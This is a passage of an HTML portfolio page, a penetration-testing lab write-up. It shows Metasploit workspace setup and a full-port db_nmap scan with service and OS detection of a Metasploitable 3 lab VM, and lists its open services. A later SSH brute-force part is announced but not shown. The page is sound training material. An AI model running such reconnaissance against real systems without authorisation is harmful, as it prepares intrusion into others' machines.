@@ -1,0 +1,826 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Metasploit Workspace & SSH Brute Force Lab — Rizuanul Haque</title>
+<link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;700;800&family=IBM+Plex+Sans:wght@300;400;500&family=IBM+Plex+Mono:wght@400;500&display=swap" rel="stylesheet">
+<style>
+  *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+  :root {
+    --bg: #0d1117;
+    --surface: #161b22;
+    --surface2: #21262d;
+    --border: #30363d;
+    --accent: #00d4ff;
+    --accent2: #3fb950;
+    --accent3: #ff6b35;
+    --text: #e6edf3;
+    --muted: #8b949e;
+    --code-bg: #1c2128;
+    --red: #ff7b72;
+    --purple: #d2a8ff;
+    --yellow: #e3b341;
+  }
+
+  body {
+    font-family: 'IBM Plex Sans', sans-serif;
+    background: var(--bg);
+    color: var(--text);
+    line-height: 1.7;
+    min-height: 100vh;
+  }
+
+  /* ── NAV ── */
+  nav {
+    position: sticky; top: 0; z-index: 200;
+    background: var(--bg); border-bottom: 1px solid var(--border);
+    padding: 0 2rem; height: 56px;
+    display: flex; align-items: center; gap: 1rem;
+    backdrop-filter: blur(12px);
+  }
+  .nav-logo { font-family: 'Syne', sans-serif; font-size: 1rem; font-weight: 800; color: var(--accent); text-decoration: none; }
+  .nav-sep { color: var(--border); }
+  .nav-title { font-family: 'IBM Plex Mono', monospace; font-size: 0.75rem; color: var(--muted); }
+  .nav-back { margin-left: auto; font-family: 'IBM Plex Mono', monospace; font-size: 0.72rem; color: var(--muted); text-decoration: none; padding: 4px 12px; border: 1px solid var(--border); border-radius: 20px; transition: all 0.2s; }
+  .nav-back:hover { color: var(--accent); border-color: var(--accent); }
+
+  /* ── HERO ── */
+  .hero {
+    padding: 4rem 2rem 3rem;
+    max-width: 900px; margin: 0 auto;
+    border-bottom: 1px solid var(--border);
+  }
+  .badge-row { display: flex; flex-wrap: wrap; gap: 0.5rem; margin-bottom: 1.5rem; }
+  .badge {
+    font-family: 'IBM Plex Mono', monospace; font-size: 0.7rem;
+    padding: 3px 10px; border-radius: 20px;
+    background: #1f2d44; color: #79c0ff; border: 1px solid #1f6feb;
+    letter-spacing: 0.04em;
+  }
+  .badge.green { background: #1a3328; color: #56d364; border-color: #3fb950; }
+  .badge.orange { background: #2d1f0e; color: #ffa657; border-color: #d1811a; }
+
+  .lab-series {
+    font-family: 'IBM Plex Mono', monospace; font-size: 0.72rem;
+    color: var(--accent2); letter-spacing: 0.12em; text-transform: uppercase;
+    margin-bottom: 0.75rem; display: flex; align-items: center; gap: 0.5rem;
+  }
+  .lab-series::before { content: ''; display: inline-block; width: 20px; height: 2px; background: var(--accent2); }
+
+  h1 { font-family: 'Syne', sans-serif; font-size: clamp(1.8rem, 4vw, 2.8rem); font-weight: 800; line-height: 1.15; letter-spacing: -0.02em; margin-bottom: 1rem; }
+  h1 span { color: var(--accent); }
+
+  .hero-meta { display: flex; flex-wrap: wrap; gap: 1.5rem; color: var(--muted); font-size: 0.82rem; margin-bottom: 1.5rem; font-family: 'IBM Plex Mono', monospace; }
+
+  .hero-desc {
+    font-size: 1rem; color: #b1bac4; max-width: 700px;
+    border-left: 3px solid var(--accent); padding-left: 1.2rem; font-weight: 300;
+  }
+
+  /* ── PART TABS ── */
+  .part-tabs {
+    max-width: 900px; margin: 0 auto;
+    display: flex; border-bottom: 1px solid var(--border);
+    position: sticky; top: 56px; z-index: 100; background: var(--bg);
+  }
+  .part-tab {
+    font-family: 'IBM Plex Mono', monospace; font-size: 0.78rem;
+    padding: 12px 24px; cursor: pointer; color: var(--muted);
+    border-bottom: 2px solid transparent; transition: all 0.2s;
+    background: none; border-top: none; border-left: none; border-right: none;
+  }
+  .part-tab:hover { color: var(--text); }
+  .part-tab.active { color: var(--accent); border-bottom-color: var(--accent); }
+
+  /* ── LAYOUT ── */
+  .layout {
+    max-width: 900px; margin: 0 auto; padding: 0 2rem 5rem;
+    display: grid; grid-template-columns: 190px 1fr; gap: 3rem; align-items: start;
+  }
+
+  /* ── TOC ── */
+  .toc { position: sticky; top: 100px; font-size: 0.8rem; }
+  .toc-label { font-family: 'IBM Plex Mono', monospace; font-size: 0.68rem; color: var(--muted); text-transform: uppercase; letter-spacing: 0.1em; margin-bottom: 0.75rem; }
+  .toc ol { list-style: none; }
+  .toc li { margin-bottom: 0.25rem; }
+  .toc a { color: var(--muted); text-decoration: none; display: block; padding: 4px 8px; border-left: 2px solid transparent; border-radius: 0 4px 4px 0; transition: all 0.2s; line-height: 1.4; font-size: 0.78rem; }
+  .toc a:hover { color: var(--accent); border-left-color: var(--accent); background: rgba(0,212,255,0.05); }
+  .toc-divider { height: 1px; background: var(--border); margin: 0.75rem 0; }
+  .toc-part { font-family: 'IBM Plex Mono', monospace; font-size: 0.65rem; color: var(--accent2); letter-spacing: 0.1em; text-transform: uppercase; padding: 4px 8px; }
+
+  /* ── PART SECTIONS ── */
+  .part { display: none; }
+  .part.active { display: block; }
+
+  /* ── CONTENT ── */
+  .content section { margin-bottom: 2.5rem; scroll-margin-top: 110px; }
+  .step-num { font-family: 'IBM Plex Mono', monospace; font-size: 0.68rem; color: var(--accent); letter-spacing: 0.12em; text-transform: uppercase; display: block; margin-bottom: 0.4rem; }
+  h2 { font-family: 'Syne', sans-serif; font-size: 1.15rem; font-weight: 700; margin-bottom: 0.9rem; padding-bottom: 0.5rem; border-bottom: 1px solid var(--border); }
+  p { color: #b1bac4; font-size: 0.92rem; margin-bottom: 0.75rem; }
+
+  /* ── PART HEADER BANNER ── */
+  .part-banner {
+    background: var(--surface); border: 1px solid var(--border);
+    border-radius: 10px; padding: 1.5rem; margin: 2rem 0;
+    display: flex; gap: 1rem; align-items: flex-start;
+  }
+  .part-banner-icon { font-size: 2rem; }
+  .part-banner-label { font-family: 'IBM Plex Mono', monospace; font-size: 0.68rem; color: var(--accent); text-transform: uppercase; letter-spacing: 0.1em; margin-bottom: 0.3rem; }
+  .part-banner-title { font-family: 'Syne', sans-serif; font-size: 1.1rem; font-weight: 800; margin-bottom: 0.4rem; }
+  .part-banner-desc { font-size: 0.85rem; color: var(--muted); }
+
+  /* ── CODE BLOCKS ── */
+  .code-block { background: var(--code-bg); border: 1px solid var(--border); border-radius: 8px; margin: 1rem 0; overflow: hidden; }
+  .code-header { display: flex; align-items: center; justify-content: space-between; padding: 7px 1rem; border-bottom: 1px solid var(--border); background: var(--surface); }
+  .code-lang { font-family: 'IBM Plex Mono', monospace; font-size: 0.68rem; color: var(--muted); letter-spacing: 0.05em; }
+  .code-dots { display: flex; gap: 5px; }
+  .code-dots span { width: 10px; height: 10px; border-radius: 50%; }
+  .dot-r { background: #f78166; } .dot-y { background: #d29922; } .dot-g { background: #3fb950; }
+  pre { padding: 1rem 1.2rem; overflow-x: auto; font-family: 'IBM Plex Mono', monospace; font-size: 0.8rem; line-height: 1.65; }
+  .cmd { color: #79c0ff; }
+  .flag { color: #ffa657; }
+  .path { color: #a5d6ff; }
+  .out { color: #56d364; }
+  .cm { color: #6e7681; font-style: italic; }
+  .prompt { color: #ff7b72; }
+  .kw { color: var(--purple); }
+
+  /* ── TERMINAL SCREENSHOT STYLE ── */
+  .terminal {
+    background: #0d1117; border: 1px solid #3a3f4b;
+    border-radius: 8px; margin: 1rem 0; overflow: hidden;
+  }
+  .terminal-bar { background: #21262d; padding: 8px 12px; display: flex; align-items: center; gap: 6px; border-bottom: 1px solid #3a3f4b; }
+  .terminal-bar span { width: 10px; height: 10px; border-radius: 50%; }
+  .tb-r { background: #f78166; } .tb-y { background: #d29922; } .tb-g { background: #3fb950; }
+  .terminal-body { padding: 1rem 1.2rem; font-family: 'IBM Plex Mono', monospace; font-size: 0.78rem; line-height: 1.7; }
+  .t-prompt { color: #ff7b72; }
+  .t-cmd { color: #79c0ff; }
+  .t-out { color: #c9d1d9; }
+  .t-success { color: #56d364; }
+  .t-info { color: #58a6ff; }
+  .t-header { color: #e3b341; font-weight: bold; }
+
+  /* ── CALLOUT ── */
+  .callout { border: 1px solid #1f6feb; background: #1f2d44; border-radius: 8px; padding: 1rem 1.2rem; margin: 1rem 0; font-size: 0.88rem; color: #a5c8f8; }
+  .callout strong { color: var(--accent); display: block; margin-bottom: 0.3rem; font-size: 0.72rem; font-family: 'IBM Plex Mono', monospace; letter-spacing: 0.08em; }
+  .callout.green { border-color: #3fb950; background: #1a3328; color: #7ee787; }
+  .callout.green strong { color: var(--accent2); }
+  .callout.orange { border-color: #d1811a; background: #2d1f0e; color: #ffa657; }
+  .callout.orange strong { color: #ffa657; }
+
+  /* ── SERVICES TABLE ── */
+  .services-table { width: 100%; border-collapse: collapse; font-family: 'IBM Plex Mono', monospace; font-size: 0.75rem; margin: 1rem 0; border-radius: 8px; overflow: hidden; }
+  .services-table th { background: var(--surface2); color: var(--muted); padding: 8px 12px; text-align: left; border-bottom: 1px solid var(--border); letter-spacing: 0.06em; font-size: 0.68rem; text-transform: uppercase; }
+  .services-table td { padding: 7px 12px; border-bottom: 1px solid var(--border); color: #c9d1d9; }
+  .services-table tr:last-child td { border-bottom: none; }
+  .services-table tr:hover td { background: var(--surface); }
+  .port-num { color: #ffa657; }
+  .proto { color: #79c0ff; }
+  .svc-name { color: #56d364; }
+  .svc-info { color: var(--muted); font-size: 0.72rem; }
+
+  /* ── SUMMARY CARD ── */
+  .summary-card { background: var(--surface); border: 1px solid var(--border); border-radius: 10px; padding: 1.5rem; }
+  .summary-card h3 { font-family: 'IBM Plex Mono', monospace; font-size: 0.78rem; color: var(--muted); margin-bottom: 1rem; letter-spacing: 0.06em; text-transform: uppercase; }
+  .cmd-list { list-style: none; }
+  .cmd-list li { display: flex; align-items: flex-start; gap: 0.75rem; padding: 0.55rem 0; border-bottom: 1px solid var(--border); font-size: 0.84rem; }
+  .cmd-list li:last-child { border-bottom: none; }
+  .cmd-name { font-family: 'IBM Plex Mono', monospace; color: var(--accent); font-size: 0.78rem; white-space: nowrap; min-width: 160px; }
+  .cmd-desc { color: var(--muted); }
+
+  /* ── SCROLL TOP ── */
+  .scroll-top { position: fixed; bottom: 2rem; right: 2rem; width: 38px; height: 38px; background: var(--surface); border: 1px solid var(--border); border-radius: 50%; color: var(--muted); font-size: 1rem; cursor: pointer; display: flex; align-items: center; justify-content: center; z-index: 100; opacity: 0; transition: all 0.2s; }
+  .scroll-top.visible { opacity: 1; }
+  .scroll-top:hover { border-color: var(--accent); color: var(--accent); }
+
+  /* ── FOOTER ── */
+  footer { border-top: 1px solid var(--border); text-align: center; padding: 1.5rem; font-family: 'IBM Plex Mono', monospace; font-size: 0.72rem; color: var(--muted); }
+  footer a { color: var(--muted); text-decoration: none; }
+  footer a:hover { color: var(--accent); }
+
+  @media (max-width: 640px) {
+    .layout { grid-template-columns: 1fr; }
+    .toc { display: none; }
+    .hero { padding: 2.5rem 1.25rem 2rem; }
+  }
+</style>
+</head>
+<body>
+
+<nav>
+  <a href="index.html" class="nav-logo">RH</a>
+  <span class="nav-sep">/</span>
+  <span class="nav-title">metasploit-workspace-ssh-lab</span>
+  <a href="projects.html" class="nav-back">← Projects</a>
+</nav>
+
+<!-- HERO -->
+<div class="hero">
+  <div class="badge-row">
+    <span class="badge">Metasploit</span>
+    <span class="badge">Nmap</span>
+    <span class="badge">SSH</span>
+    <span class="badge">Kali Linux</span>
+    <span class="badge orange">Brute Force</span>
+    <span class="badge green">✓ Completed</span>
+  </div>
+  <div class="lab-series">NPower NII Labworks · 2-Part Series</div>
+  <h1>Metasploit <span>Workspace</span> &<br>SSH Brute Force Lab</h1>
+  <div class="hero-meta">
+    <span>🔐 Penetration Testing</span>
+    <span>🛠 Kali Linux / Metasploit</span>
+    <span>📡 Network Reconnaissance</span>
+    <span>🔑 Credential Exploitation</span>
+  </div>
+  <p class="hero-desc">
+    A two-part lab series from the NPower Advanced Cybersecurity Cohort. Part 1 covers setting up Metasploit workspaces and using Nmap to scan a target network. Part 2 builds on that reconnaissance to brute force an open SSH port and gain remote access to a vulnerable machine.
+  </p>
+</div>
+
+<!-- TABS -->
+<div class="part-tabs">
+  <button class="part-tab active" onclick="switchPart('part1', this)">Part 1 — Workspace Lab</button>
+  <button class="part-tab" onclick="switchPart('part2', this)">Part 2 — SSH Brute Force</button>
+</div>
+
+<div class="layout">
+
+  <!-- SIDEBAR TOC -->
+  <aside class="toc" id="toc">
+    <p class="toc-label">On this page</p>
+    <ol id="tocList">
+      <li><a href="#overview1">Overview</a></li>
+      <li><a href="#step1">Step 1 — Root Access</a></li>
+      <li><a href="#step2">Step 2 — Start PostgreSQL</a></li>
+      <li><a href="#step3">Step 3 — Init MSF DB</a></li>
+      <li><a href="#step4">Step 4 — Launch msfconsole</a></li>
+      <li><a href="#step5">Step 5 — View Workspaces</a></li>
+      <li><a href="#step6">Step 6 — Create Workspace</a></li>
+      <li><a href="#step7">Step 7 — Find Target IP</a></li>
+      <li><a href="#step8">Step 8 — Run db_nmap</a></li>
+      <li><a href="#step9">Step 9 — Verify Services</a></li>
+      <li><a href="#step10">Step 10 — List Services</a></li>
+      <li><a href="#summary1">Summary</a></li>
+    </ol>
+  </aside>
+
+  <main class="content">
+
+    <!-- ══════════════ PART 1 ══════════════ -->
+    <div class="part active" id="part1">
+
+      <div class="part-banner">
+        <span class="part-banner-icon">🗂️</span>
+        <div>
+          <div class="part-banner-label">Part 1 of 2</div>
+          <div class="part-banner-title">Workspace Lab</div>
+          <div class="part-banner-desc">Create and manage Metasploit workspaces, then use Nmap to scan a Metasploitable 3 VM and store reconnaissance data for later exploitation.</div>
+        </div>
+      </div>
+
+      <section id="overview1">
+        <span class="step-num">// Overview</span>
+        <h2>What Are Workspaces?</h2>
+        <p>A Metasploit workspace is essentially a save state for your reconnaissance. When scanning a network for open ports and services, you don't want to start over every session. Workspaces let you store Nmap results — including open ports, running services, and OS fingerprints — organized by target environment.</p>
+        <div class="callout">
+          <strong>// WHY THIS MATTERS</strong>
+          In a real engagement, you might be testing multiple networks or returning to a target days later. Workspaces keep your data organized and persistent inside the Metasploit database, powered by PostgreSQL.
+        </div>
+      </section>
+
+      <section id="step1">
+        <span class="step-num">// Step 01</span>
+        <h2>Open Terminal & Become Root</h2>
+        <p>Open your Kali Linux VM terminal and escalate to root so all subsequent commands run with full privileges.</p>
+        <div class="terminal">
+          <div class="terminal-bar"><span class="tb-r"></span><span class="tb-y"></span><span class="tb-g"></span></div>
+          <div class="terminal-body">
+            <span class="t-prompt">┌──(kali⊕kali)-[~]<br>└─$ </span><span class="t-cmd">sudo su</span><br>
+            [sudo] password for kali: <br>
+            <span class="t-prompt">┌──(root⊕kali)-[/home/kali]<br># </span>
+          </div>
+        </div>
+      </section>
+
+      <section id="step2">
+        <span class="step-num">// Step 02</span>
+        <h2>Start PostgreSQL Service</h2>
+        <p>Metasploit uses PostgreSQL as its backend database. Start the service and verify it's running.</p>
+        <div class="terminal">
+          <div class="terminal-bar"><span class="tb-r"></span><span class="tb-y"></span><span class="tb-g"></span></div>
+          <div class="terminal-body">
+            <span class="t-prompt"># </span><span class="t-cmd">service postgresql start</span><br><br>
+            <span class="t-prompt"># </span><span class="t-cmd">service postgresql status</span><br>
+            <span class="t-success">● postgresql.service - PostgreSQL RDBMS</span><br>
+            <span class="t-out">&nbsp;&nbsp;&nbsp;Loaded: loaded (/lib/systemd/system/postgresql.service; disabled)</span><br>
+            <span class="t-success">&nbsp;&nbsp;&nbsp;Active: active (exited) since Fri 2022-09-09 22:02:28 EDT</span>
+          </div>
+        </div>
+        <div class="callout">
+          <strong>// TIP</strong>
+          If the terminal freezes after checking status, press <code style="font-family:'IBM Plex Mono',monospace">Ctrl + C</code> to return to the prompt.
+        </div>
+      </section>
+
+      <section id="step3">
+        <span class="step-num">// Step 03</span>
+        <h2>Initialize the MSF Database</h2>
+        <p>Before using workspaces, initialize the Metasploit database so it's ready to store reconnaissance data.</p>
+        <div class="terminal">
+          <div class="terminal-bar"><span class="tb-r"></span><span class="tb-y"></span><span class="tb-g"></span></div>
+          <div class="terminal-body">
+            <span class="t-prompt"># </span><span class="t-cmd">msfdb init</span><br>
+            <span class="t-success">[+] Starting database</span>
+          </div>
+        </div>
+      </section>
+
+      <section id="step4">
+        <span class="step-num">// Step 04</span>
+        <h2>Launch msfconsole</h2>
+        <p>Enter the Metasploit console. Use the <code style="font-family:'IBM Plex Mono',monospace;color:var(--accent);font-size:0.85em">-q</code> flag to skip the banner and launch in quiet mode.</p>
+        <div class="terminal">
+          <div class="terminal-bar"><span class="tb-r"></span><span class="tb-y"></span><span class="tb-g"></span></div>
+          <div class="terminal-body">
+            <span class="t-prompt"># </span><span class="t-cmd">msfconsole -q</span><br>
+            <span class="t-info">msf6 &gt; </span>
+          </div>
+        </div>
+        <div class="callout">
+          <strong>// FLAG EXPLAINED</strong>
+          <code style="font-family:'IBM Plex Mono',monospace">msfconsole</code> launches with the full Metasploit banner. Adding <code style="font-family:'IBM Plex Mono',monospace">-q</code> (quiet mode) skips it for a cleaner session start.
+        </div>
+      </section>
+
+      <section id="step5">
+        <span class="step-num">// Step 05</span>
+        <h2>View Existing Workspaces</h2>
+        <p>Check which workspaces exist and which one is currently active. Use <code style="font-family:'IBM Plex Mono',monospace;color:var(--accent);font-size:0.85em">workspace -v</code> for verbose output showing hosts, services, vulns, and creds.</p>
+        <div class="terminal">
+          <div class="terminal-bar"><span class="tb-r"></span><span class="tb-y"></span><span class="tb-g"></span></div>
+          <div class="terminal-body">
+            <span class="t-info">msf6 &gt; </span><span class="t-cmd">workspace -v</span><br><br>
+            <span class="t-header">Workspaces<br>══════════</span><br><br>
+            <span class="t-out">current&nbsp;&nbsp;name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hosts&nbsp;&nbsp;services&nbsp;&nbsp;vulns&nbsp;&nbsp;creds&nbsp;&nbsp;loots&nbsp;&nbsp;notes</span><br>
+            <span class="t-out">───────&nbsp;&nbsp;────&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;─────&nbsp;&nbsp;────────&nbsp;&nbsp;─────&nbsp;&nbsp;─────&nbsp;&nbsp;─────&nbsp;&nbsp;─────</span><br>
+            <span class="t-success">*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;default&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0</span>
+          </div>
+        </div>
+      </section>
+
+      <section id="step6">
+        <span class="step-num">// Step 06</span>
+        <h2>Create a New Workspace</h2>
+        <p>Create a new workspace named <code style="font-family:'IBM Plex Mono',monospace;color:var(--accent);font-size:0.85em">meta3</code> to store all reconnaissance data from the Metasploitable 3 target. You can use any name you prefer.</p>
+        <div class="terminal">
+          <div class="terminal-bar"><span class="tb-r"></span><span class="tb-y"></span><span class="tb-g"></span></div>
+          <div class="terminal-body">
+            <span class="t-info">msf6 &gt; </span><span class="t-cmd">workspace -a meta3</span><br>
+            <span class="t-success">[*] Added workspace: meta3</span><br>
+            <span class="t-success">[*] Workspace: meta3</span><br><br>
+            <span class="t-info">msf6 &gt; </span><span class="t-cmd">workspace -v</span><br><br>
+            <span class="t-header">Workspaces<br>══════════</span><br><br>
+            <span class="t-out">current&nbsp;&nbsp;name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hosts&nbsp;&nbsp;services</span><br>
+            <span class="t-out">───────&nbsp;&nbsp;────&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;─────&nbsp;&nbsp;────────</span><br>
+            <span class="t-out">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;default&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0</span><br>
+            <span class="t-success">*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;meta3&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0</span>
+          </div>
+        </div>
+      </section>
+
+      <section id="step7">
+        <span class="step-num">// Step 07</span>
+        <h2>Launch Metasploitable 3 & Find its IP</h2>
+        <p>Start your Metasploitable 3 VM and find its IPv4 address. Make sure both Kali and Metasploitable 3 are on the same NAT Network.</p>
+        <div class="terminal">
+          <div class="terminal-bar"><span class="tb-r"></span><span class="tb-y"></span><span class="tb-g"></span></div>
+          <div class="terminal-body">
+            <span class="t-header">Ethernet adapter Local Area Connection:</span><br><br>
+            <span class="t-out">&nbsp;&nbsp;Connection-specific DNS Suffix  :</span><br>
+            <span class="t-out">&nbsp;&nbsp;Link-local IPv6 Address . . . . : fe80::ec25:</span><br>
+            <span class="t-success">&nbsp;&nbsp;IPv4 Address. . . . . . . . . . : 10.0.2.20</span>
+          </div>
+        </div>
+        <div class="callout orange">
+          <strong>// NOTE</strong>
+          The IP address <code style="font-family:'IBM Plex Mono',monospace">10.0.2.20</code> is from this lab environment. Your Metasploitable 3 IP may be different — always verify with <code style="font-family:'IBM Plex Mono',monospace">ipconfig</code> (Windows) or <code style="font-family:'IBM Plex Mono',monospace">ip a</code> (Linux) on the target machine.
+        </div>
+      </section>
+
+      <section id="step8">
+        <span class="step-num">// Step 08</span>
+        <h2>Run db_nmap Against the Target</h2>
+        <p>Use <code style="font-family:'IBM Plex Mono',monospace;color:var(--accent);font-size:0.85em">db_nmap</code> instead of plain <code style="font-family:'IBM Plex Mono',monospace;color:var(--accent);font-size:0.85em">nmap</code> — it automatically saves results to your active workspace. This scan checks all ports, detects running services, and fingerprints the OS. It can take up to 5 minutes.</p>
+        <div class="terminal">
+          <div class="terminal-bar"><span class="tb-r"></span><span class="tb-y"></span><span class="tb-g"></span></div>
+          <div class="terminal-body">
+            <span class="t-info">msf6 &gt; </span><span class="t-cmd">db_nmap -p- -sV -O 10.0.2.20</span><br>
+            <span class="t-success">[*] Nmap: Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-09 22:37 EDT</span>
+          </div>
+        </div>
+
+        <div class="code-block" style="margin-top:1rem;">
+          <div class="code-header">
+            <div class="code-dots"><span class="dot-r"></span><span class="dot-y"></span><span class="dot-g"></span></div>
+            <span class="code-lang">flag breakdown</span>
+          </div>
+          <pre><span class="flag">-p-</span>     <span class="cm"># Scan ALL 65,535 ports (not just common ones)</span>
+<span class="flag">-sV</span>     <span class="cm"># Detect service versions running on each port</span>
+<span class="flag">-O</span>      <span class="cm"># Fingerprint the target operating system</span></pre>
+        </div>
+      </section>
+
+      <section id="step9">
+        <span class="step-num">// Step 09</span>
+        <h2>Verify Workspace Was Updated</h2>
+        <p>After the scan completes, run <code style="font-family:'IBM Plex Mono',monospace;color:var(--accent);font-size:0.85em">workspace -v</code> again to confirm the services count updated in the meta3 workspace.</p>
+        <div class="terminal">
+          <div class="terminal-bar"><span class="tb-r"></span><span class="tb-y"></span><span class="tb-g"></span></div>
+          <div class="terminal-body">
+            <span class="t-success">[*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 290.51 seconds</span><br>
+            <span class="t-info">msf6 &gt; </span><span class="t-cmd">workspace -v</span><br><br>
+            <span class="t-header">Workspaces<br>══════════</span><br><br>
+            <span class="t-out">current&nbsp;&nbsp;name&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hosts&nbsp;&nbsp;services&nbsp;&nbsp;vulns&nbsp;&nbsp;creds&nbsp;&nbsp;loots&nbsp;&nbsp;notes</span><br>
+            <span class="t-out">───────&nbsp;&nbsp;────&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;─────&nbsp;&nbsp;────────&nbsp;&nbsp;─────&nbsp;&nbsp;─────&nbsp;&nbsp;─────&nbsp;&nbsp;─────</span><br>
+            <span class="t-out">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;default&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0</span><br>
+            <span class="t-success">*&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;meta3&nbsp;&nbsp;&nbsp;&nbsp;1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;19&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;2</span>
+          </div>
+        </div>
+        <div class="callout green">
+          <strong>// RESULT</strong>
+          The meta3 workspace now shows 1 host and 19 services discovered — all stored and ready for the next phase of the engagement.
+        </div>
+      </section>
+
+      <section id="step10">
+        <span class="step-num">// Step 10</span>
+        <h2>View Open Ports & Services</h2>
+        <p>Type <code style="font-family:'IBM Plex Mono',monospace;color:var(--accent);font-size:0.85em">services</code> to list all open ports and the protocols running on them, pulled from the workspace database.</p>
+        <div class="terminal">
+          <div class="terminal-bar"><span class="tb-r"></span><span class="tb-y"></span><span class="tb-g"></span></div>
+          <div class="terminal-body">
+            <span class="t-info">msf6 &gt; </span><span class="t-cmd">services</span>
+          </div>
+        </div>
+
+        <table class="services-table" style="margin-top:1rem;">
+          <thead>
+            <tr><th>Host</th><th>Port</th><th>Proto</th><th>Name</th><th>State</th><th>Info</th></tr>
+          </thead>
+          <tbody>
+            <tr><td>10.0.2.20</td><td class="port-num">21</td><td class="proto">tcp</td><td class="svc-name">ftp</td><td>open</td><td class="svc-info">Microsoft ftpd</td></tr>
+            <tr><td>10.0.2.20</td><td class="port-num">22</td><td class="proto">tcp</td><td class="svc-name">ssh</td><td>open</td><td class="svc-info">OpenSSH 7.1 protocol 2.0</td></tr>
+            <tr><td>10.0.2.20</td><td class="port-num">80</td><td class="proto">tcp</td><td class="svc-name">http</td><td>open</td><td class="svc-info">Microsoft IIS httpd 7.5</td></tr>
+            <tr><td>10.0.2.20</td><td class="port-num">1617</td><td class="proto">tcp</td><td class="svc-name">java-rmi</td><td>open</td><td class="svc-info">Java RMI</td></tr>
+            <tr><td>10.0.2.20</td><td class="port-num">4848</td><td class="proto">tcp</td><td class="svc-name">ssl/http</td><td>open</td><td class="svc-info">Oracle Glassfish Application Server</td></tr>
+            <tr><td>10.0.2.20</td><td class="port-num">5985</td><td class="proto">tcp</td><td class="svc-name">http</td><td>open</td><td class="svc-info">Microsoft HTTPAPI httpd 2.0</td></tr>
+            <tr><td>10.0.2.20</td><td class="port-num">8020</td><td class="proto">tcp</td><td class="svc-name">http</td><td>open</td><td class="svc-info">Apache httpd</td></tr>
+            <tr><td>10.0.2.20</td><td class="port-num">8022</td><td class="proto">tcp</td><td class="svc-name">http</td><td>open</td><td class="svc-info">Apache Tomcat/Coyote JSP engine 1.1</td></tr>
+            <tr><td>10.0.2.20</td><td class="port-num">8080</td><td class="proto">tcp</td><td class="svc-name">http</td><td>open</td><td class="svc-info">Sun GlassFish Open Source Edition 4.0</td></tr>
+            <tr><td>10.0.2.20</td><td class="port-num">8484</td><td class="proto">tcp</td><td class="svc-name">http</td><td>open</td><td class="svc-info">Jetty winstone-2.8</td></tr>
+            <tr><td>10.0.2.20</td><td class="port-num">8585</td><td class="proto">tcp</td><td class="svc-name">http</td><td>open</td><td class="svc-info">Apache httpd 2.2.21 (Win64) PHP/5.3.10</td></tr>
+            <tr><td>10.0.2.20</td><td class="port-num">49153</td><td class="proto">tcp</td><td class="svc-name">msrpc</td><td>open</td><td class="svc-info">Microsoft Windows RPC</td></tr>
+            <tr><td>10.0.2.20</td><td class="port-num">49154</td><td class="proto">tcp</td><td class="svc-name">msrpc</td><td>open</td><td class="svc-info">Microsoft Windows RPC</td></tr>
+          </tbody>
+        </table>
+      </section>
+
+      <section id="summary1">
+        <span class="step-num">// Summary</span>
+        <h2>Lab 1 Summary</h2>
+        <p>With the workspace populated, all 19 discovered services are now stored in the Metasploit database. This reconnaissance data is the foundation for Part 2 — where we'll exploit the open SSH port on port 22.</p>
+        <div class="summary-card" style="margin-top:1rem;">
+          <h3>// Commands Used</h3>
+          <ul class="cmd-list">
+            <li><span class="cmd-name">service postgresql start</span><span class="cmd-desc">Start the PostgreSQL database service</span></li>
+            <li><span class="cmd-name">msfdb init</span><span class="cmd-desc">Initialize the Metasploit database</span></li>
+            <li><span class="cmd-name">msfconsole -q</span><span class="cmd-desc">Launch Metasploit in quiet mode</span></li>
+            <li><span class="cmd-name">workspace -v</span><span class="cmd-desc">List all workspaces with verbose stats</span></li>
+            <li><span class="cmd-name">workspace -a &lt;name&gt;</span><span class="cmd-desc">Create a new named workspace</span></li>
+            <li><span class="cmd-name">db_nmap -p- -sV -O &lt;IP&gt;</span><span class="cmd-desc">Full port scan saving results to workspace</span></li>
+            <li><span class="cmd-name">services</span><span class="cmd-desc">List all discovered open ports and services</span></li>
+          </ul>
+        </div>
+        <div class="callout orange" style="margin-top:1rem;">
+          <strong>// THINK ABOUT IT</strong>
